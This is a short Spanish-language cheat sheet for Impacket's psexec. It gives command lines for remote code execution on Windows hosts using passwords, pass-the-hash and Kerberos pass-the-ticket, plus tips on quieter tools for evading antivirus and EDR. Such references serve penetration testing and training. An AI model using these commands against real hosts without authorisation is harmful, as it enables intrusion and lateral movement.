<h1 align="center">Impacket PsExec Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for gaining interactive, high-privilege remote code execution (RCE) on Windows hosts using a Python-based implementation of the classic Sysinternals PsExec.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-PsExec-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Remote_Execution-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

```
impacket-psexec Administrador:Password123@IP_OBJETIVO
```

```
impacket-psexec dominio.local/admin_user:Password123@IP_OBJETIVO
```

```
impacket-psexec -hashes :HASH_NT dominio/usuario@IP_OBJETIVO
```

```
impacket-psexec -k -no-pass dominio/usuario@IP_OBJETIVO
```
> Usando Tickets de Kerberos (Pass-the-Ticket)
> Si ya has solicitado un ticket Kerberos válido y lo tienes cargado en tu variable de entorno (export KRB5CCNAME=/ruta/ticket.ccache):


## Si estas en un entorno con Antivirus / EDR

impacket-wmiexec: Utiliza WMI (Windows Management Instrumentation) para ejecutar comandos. Es mucho más silencioso porque no crea servicios ni sube ejecutables.

impacket-smbexec: Crea un servicio de Windows temporal pero, en lugar de subir un ejecutable, utiliza la propia terminal nativa (cmd.exe) para redirigir la entrada y salida mediante archivos temporales compartidos.
